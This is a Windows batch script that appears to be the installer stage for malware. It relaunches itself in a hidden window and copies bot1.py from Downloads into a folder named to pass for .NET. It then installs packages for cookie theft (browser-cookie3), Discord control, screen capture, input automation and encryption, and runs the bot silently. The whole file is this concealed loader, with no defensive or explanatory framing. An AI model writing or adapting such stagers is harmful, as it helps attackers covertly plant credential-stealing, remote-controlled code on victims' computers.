@echo off
if "%1"=="hidden" goto start
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
exit

:start
setlocal enabledelayedexpansion

set "WORKDIR=%LOCALAPPDATA%\.NetFramework"
set "DOWNLOADS=%USERPROFILE%\Downloads"
set "PYFILE=bot1.py"

if not exist "%WORKDIR%" (
    mkdir "%WORKDIR%"
)

if exist "%DOWNLOADS%\%PYFILE%" (
    copy "%DOWNLOADS%\%PYFILE%" "%WORKDIR%" >nul
) else (
    exit /b 1
)

cd /d "%WORKDIR%"

:: Check if python is installed
python --version >nul 2>&1
if errorlevel 1 (
    echo Python is not installed. Please install Python 3.6 or higher.
    exit /b 1
)

:: Create virtual environment if it doesn't exist
if not exist "venv\Scripts\activate.bat" (
    python -m venv venv
    if errorlevel 1 exit /b 1
)

:: Activate venv and install packages
call "%WORKDIR%\venv\Scripts\activate.bat"
python -m pip install --upgrade pip
if errorlevel 1 exit /b 1

python -m pip install --upgrade requests numpy pillow opencv-python pyautogui psutil pywin32 pycryptodome scipy pytz discord.py browser-cookie3
if errorlevel 1 exit /b 1

:: Run the python script
python "%WORKDIR%\%PYFILE%"

exit